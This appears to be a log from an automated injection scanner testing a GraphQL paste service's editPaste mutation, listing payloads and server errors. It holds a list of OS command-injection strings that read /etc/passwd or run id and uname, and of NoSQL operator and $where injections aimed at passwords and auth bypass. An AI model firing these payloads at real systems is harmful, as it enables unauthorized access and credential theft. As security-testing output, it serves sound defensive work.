2026-02-03 20:06:25,455 | INFO    | GraphQLClient        | -                              | introspection        | POST | success  |  0.514s | payload=[__schema] response=[{"data": {"__schema": {"queryType": {"name": "Query", "fields": [{"name": "pastes", "args": [{"name": "public", "type": {"name": "Boolean", "kind": "SCALAR", "ofType": null}}, {"name": "limit", "type"…]
2026-02-03 20:18:35,012 | INFO    | InjectionTester      | and_cat_passwd                 | editPaste.content    | POST | success  |  0.003s | payload=[&& cat /etc/passwd] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"EditPaste\".", "locations": [{"line": 1, "column": 77}]}, {"message": "Cannot query field \"message\" on type \"EditPaste\".", "locations":…]
2026-02-03 20:18:35,016 | INFO    | InjectionTester      | semicolon_uname                | editPaste.content    | POST | success  |  0.003s | payload=[;uname -a] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"EditPaste\".", "locations": [{"line": 1, "column": 68}]}, {"message": "Cannot query field \"message\" on type \"EditPaste\".", "locations":…]
2026-02-03 20:18:35,018 | INFO    | InjectionTester      | pipe_uname                     | editPaste.content    | POST | success  |  0.003s | payload=[|uname -a] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"EditPaste\".", "locations": [{"line": 1, "column": 68}]}, {"message": "Cannot query field \"message\" on type \"EditPaste\".", "locations":…]
2026-02-03 20:18:35,021 | INFO    | InjectionTester      | double_pipe_uname              | editPaste.content    | POST | success  |  0.003s | payload=[||uname -a] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"EditPaste\".", "locations": [{"line": 1, "column": 69}]}, {"message": "Cannot query field \"message\" on type \"EditPaste\".", "locations":…]
2026-02-03 20:18:35,024 | INFO    | InjectionTester      | and_uname                      | editPaste.content    | POST | success  |  0.003s | payload=[&& uname -a] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"EditPaste\".", "locations": [{"line": 1, "column": 70}]}, {"message": "Cannot query field \"message\" on type \"EditPaste\".", "locations":…]
2026-02-03 20:18:35,028 | INFO    | InjectionTester      | backtick_cat_passwd            | editPaste.content    | POST | success  |  0.003s | payload=[`cat /etc/passwd`] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"EditPaste\".", "locations": [{"line": 1, "column": 76}]}, {"message": "Cannot query field \"message\" on type \"EditPaste\".", "locations":…]
2026-02-03 20:18:35,031 | INFO    | InjectionTester      | backtick_id                    | editPaste.content    | POST | success  |  0.003s | payload=[`id`] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"EditPaste\".", "locations": [{"line": 1, "column": 63}]}, {"message": "Cannot query field \"message\" on type \"EditPaste\".", "locations":…]
2026-02-03 20:18:35,034 | INFO    | InjectionTester      | backtick_uname                 | editPaste.content    | POST | success  |  0.003s | payload=[`uname -a`] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"EditPaste\".", "locations": [{"line": 1, "column": 69}]}, {"message": "Cannot query field \"message\" on type \"EditPaste\".", "locations":…]
2026-02-03 20:18:35,037 | INFO    | InjectionTester      | dollar_cat_passwd              | editPaste.content    | POST | success  |  0.003s | payload=[$(cat /etc/passwd)] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"EditPaste\".", "locations": [{"line": 1, "column": 77}]}, {"message": "Cannot query field \"message\" on type \"EditPaste\".", "locations":…]
2026-02-03 20:18:35,040 | INFO    | InjectionTester      | dollar_id                      | editPaste.content    | POST | success  |  0.003s | payload=[$(id)] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"EditPaste\".", "locations": [{"line": 1, "column": 64}]}, {"message": "Cannot query field \"message\" on type \"EditPaste\".", "locations":…]
2026-02-03 20:18:35,042 | INFO    | InjectionTester      | dollar_uname                   | editPaste.content    | POST | success  |  0.003s | payload=[$(uname -a)] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"EditPaste\".", "locations": [{"line": 1, "column": 70}]}, {"message": "Cannot query field \"message\" on type \"EditPaste\".", "locations":…]
2026-02-03 20:18:35,045 | INFO    | InjectionTester      | plain_uname                    | editPaste.content    | POST | success  |  0.003s | payload=[uname -a] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"EditPaste\".", "locations": [{"line": 1, "column": 67}]}, {"message": "Cannot query field \"message\" on type \"EditPaste\".", "locations":…]
2026-02-03 20:18:35,048 | INFO    | InjectionTester      | chain_semicolon                | editPaste.content    | POST | success  |  0.003s | payload=[;cat /etc/passwd;id] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"EditPaste\".", "locations": [{"line": 1, "column": 78}]}, {"message": "Cannot query field \"message\" on type \"EditPaste\".", "locations":…]
2026-02-03 20:18:35,051 | INFO    | InjectionTester      | chain_pipe                     | editPaste.content    | POST | success  |  0.003s | payload=[|cat /etc/passwd|id] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"EditPaste\".", "locations": [{"line": 1, "column": 78}]}, {"message": "Cannot query field \"message\" on type \"EditPaste\".", "locations":…]
2026-02-03 20:18:35,054 | INFO    | InjectionTester      | chain_and                      | editPaste.content    | POST | success  |  0.002s | payload=[&&cat /etc/passwd&&id] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"EditPaste\".", "locations": [{"line": 1, "column": 80}]}, {"message": "Cannot query field \"message\" on type \"EditPaste\".", "locations":…]
2026-02-03 20:18:35,057 | INFO    | InjectionTester      | plain_cat_passwd               | editPaste.content    | POST | success  |  0.003s | payload=[cat /etc/passwd] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"EditPaste\".", "locations": [{"line": 1, "column": 74}]}, {"message": "Cannot query field \"message\" on type \"EditPaste\".", "locations":…]
2026-02-03 20:18:35,060 | INFO    | InjectionTester      | space_semicolon_cat            | editPaste.content    | POST | success  |  0.003s | payload=[; cat /etc/passwd] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"EditPaste\".", "locations": [{"line": 1, "column": 76}]}, {"message": "Cannot query field \"message\" on type \"EditPaste\".", "locations":…]
2026-02-03 20:18:35,063 | INFO    | InjectionTester      | space_pipe_cat                 | editPaste.content    | POST | success  |  0.003s | payload=[| cat /etc/passwd] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"EditPaste\".", "locations": [{"line": 1, "column": 76}]}, {"message": "Cannot query field \"message\" on type \"EditPaste\".", "locations":…]
2026-02-03 20:18:35,066 | INFO    | InjectionTester      | space_and_cat                  | editPaste.content    | POST | success  |  0.003s | payload=[&& cat /etc/passwd] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"EditPaste\".", "locations": [{"line": 1, "column": 77}]}, {"message": "Cannot query field \"message\" on type \"EditPaste\".", "locations":…]
2026-02-03 20:18:35,068 | INFO    | InjectionTester      | mongo_ne_operator              | editPaste.content    | POST | success  |  0.002s | payload=[{"$ne": ""}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:34) Expected Name, found $\n\n1: mutation { editPaste(content: \"{\"$ne\": \"\"}\", id: 1, title: \"test\") { id message error success } }\n           …]
2026-02-03 20:18:35,069 | INFO    | InjectionTester      | mongo_gt_operator              | editPaste.content    | POST | success  |  0.002s | payload=[{"$gt": ""}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:34) Expected Name, found $\n\n1: mutation { editPaste(content: \"{\"$gt\": \"\"}\", id: 1, title: \"test\") { id message error success } }\n           …]
2026-02-03 20:18:35,072 | INFO    | InjectionTester      | mongo_gte_operator             | editPaste.content    | POST | success  |  0.002s | payload=[{"$gte": ""}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:34) Expected Name, found $\n\n1: mutation { editPaste(content: \"{\"$gte\": \"\"}\", id: 1, title: \"test\") { id message error success } }\n          …]
2026-02-03 20:18:35,074 | INFO    | InjectionTester      | mongo_lt_operator              | editPaste.content    | POST | success  |  0.002s | payload=[{"$lt": "~"}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:34) Expected Name, found $\n\n1: mutation { editPaste(content: \"{\"$lt\": \"~\"}\", id: 1, title: \"test\") { id message error success } }\n          …]
2026-02-03 20:18:35,076 | INFO    | InjectionTester      | mongo_regex_all                | editPaste.content    | POST | success  |  0.002s | payload=[{"$regex": ".*"}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:34) Expected Name, found $\n\n1: mutation { editPaste(content: \"{\"$regex\": \".*\"}\", id: 1, title: \"test\") { id message error success } }\n      …]
2026-02-03 20:18:35,078 | INFO    | InjectionTester      | mongo_regex_admin              | editPaste.content    | POST | success  |  0.002s | payload=[{"$regex": "^admin"}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:34) Expected Name, found $\n\n1: mutation { editPaste(content: \"{\"$regex\": \"^admin\"}\", id: 1, title: \"test\") { id message error success } }\n  …]
2026-02-03 20:18:35,080 | INFO    | InjectionTester      | mongo_in_operator              | editPaste.content    | POST | success  |  0.002s | payload=[{"$in": ["admin", "root", "test"]}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:34) Expected Name, found $\n\n1: mutation { editPaste(content: \"{\"$in\": [\"admin\", \"root\", \"test\"]}\", id: 1, title: \"test\") { id message err…]
2026-02-03 20:18:35,082 | INFO    | InjectionTester      | mongo_nin_operator             | editPaste.content    | POST | success  |  0.002s | payload=[{"$nin": ["impossible_value_xyz"]}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:34) Expected Name, found $\n\n1: mutation { editPaste(content: \"{\"$nin\": [\"impossible_value_xyz\"]}\", id: 1, title: \"test\") { id message error s…]
2026-02-03 20:18:35,084 | INFO    | InjectionTester      | mongo_exists_true              | editPaste.content    | POST | success  |  0.002s | payload=[{"$exists": true}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:34) Expected Name, found $\n\n1: mutation { editPaste(content: \"{\"$exists\": true}\", id: 1, title: \"test\") { id message error success } }\n       …]
2026-02-03 20:18:35,086 | INFO    | InjectionTester      | mongo_or_bypass                | editPaste.content    | POST | success  |  0.002s | payload=[{"$or": [{"": ""}, {"$gt": ""}]}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:34) Expected Name, found $\n\n1: mutation { editPaste(content: \"{\"$or\": [{\"\": \"\"}, {\"$gt\": \"\"}]}\", id: 1, title: \"test\") { id message err…]
2026-02-03 20:18:35,089 | INFO    | InjectionTester      | mongo_where_true               | editPaste.content    | POST | success  |  0.003s | payload=[' || true || '] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"EditPaste\".", "locations": [{"line": 1, "column": 73}]}, {"message": "Cannot query field \"message\" on type \"EditPaste\".", "locations":…]
2026-02-03 20:18:35,092 | INFO    | InjectionTester      | mongo_where_1_eq_1             | editPaste.content    | POST | success  |  0.003s | payload=[1' || '1'=='1] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"EditPaste\".", "locations": [{"line": 1, "column": 72}]}, {"message": "Cannot query field \"message\" on type \"EditPaste\".", "locations":…]
2026-02-03 20:18:35,095 | INFO    | InjectionTester      | mongo_where_sleep              | editPaste.content    | POST | success  |  0.003s | payload=[';sleep(5000);'] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"EditPaste\".", "locations": [{"line": 1, "column": 74}]}, {"message": "Cannot query field \"message\" on type \"EditPaste\".", "locations":…]
2026-02-03 20:18:35,097 | INFO    | InjectionTester      | mongo_where_this               | editPaste.content    | POST | success  |  0.003s | payload=[' || this.password || '] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"EditPaste\".", "locations": [{"line": 1, "column": 82}]}, {"message": "Cannot query field \"message\" on type \"EditPaste\".", "locations":…]
2026-02-03 20:18:35,100 | INFO    | InjectionTester      | mongo_where_function           | editPaste.content    | POST | success  |  0.003s | payload=[';return true;var x='] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"EditPaste\".", "locations": [{"line": 1, "column": 80}]}, {"message": "Cannot query field \"message\" on type \"EditPaste\".", "locations":…]
2026-02-03 20:18:35,103 | INFO    | InjectionTester      | mongo_where_tojsononeline      | editPaste.content    | POST | success  |  0.003s | payload=[' || tojsononeline(this) || '] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"EditPaste\".", "locations": [{"line": 1, "column": 88}]}, {"message": "Cannot query field \"message\" on type \"EditPaste\".", "locations":…]
2026-02-03 20:18:35,108 | INFO    | InjectionTester      | graphql_nested_ne              | editPaste.content    | POST | success  |  0.004s | payload=[{"password": {"$ne": ""}}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:42) Expected :, found String \": {\"\n\n1: mutation { editPaste(content: \"{\"password\": {\"$ne\": \"\"}}\", id: 1, title: \"test\") { id message erro…]
